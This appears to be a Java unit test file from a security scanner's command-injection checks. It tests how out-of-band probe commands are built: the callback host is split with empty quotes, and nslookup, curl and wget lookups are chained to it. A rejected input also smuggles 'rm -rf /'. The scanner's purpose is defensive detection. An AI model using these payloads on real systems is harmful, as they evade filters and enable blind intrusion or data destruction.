package com.mcpscanner.checks.catalog.commandinjection;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;

class OutOfBandCommandTest {

    @Test
    void splitsTheHostWithAnEmptyQuotePairSoOnlyAShellCanRejoinIt() {
        assertThat(OutOfBandCommand.shellJoined("abcdef.oastify.com")).isEqualTo("abcdef.oa''stify.com");
        assertThat(OutOfBandCommand.shellJoined("abcd")).isEqualTo("ab''cd");
    }

    @Test
    void triesDnsThenHttpLookupsOfTheSplitHost() {
        String command = OutOfBandCommand.reaching("abcd");

        assertThat(command).isEqualTo("nslookup ab''cd||getent hosts ab''cd||curl -s http://ab''cd/"
                + "||wget -q -O- http://ab''cd/");
        assertThat(command).doesNotContain("abcd");
    }

    @Test
    void refusesTextThatIsNotAHostname() {
        assertThatIllegalArgumentException().isThrownBy(() -> OutOfBandCommand.reaching("a; rm -rf /"));
        assertThatIllegalArgumentException().isThrownBy(() -> OutOfBandCommand.reaching("ab"));
        assertThatIllegalArgumentException().isThrownBy(() -> OutOfBandCommand.reaching(null));
    }
}
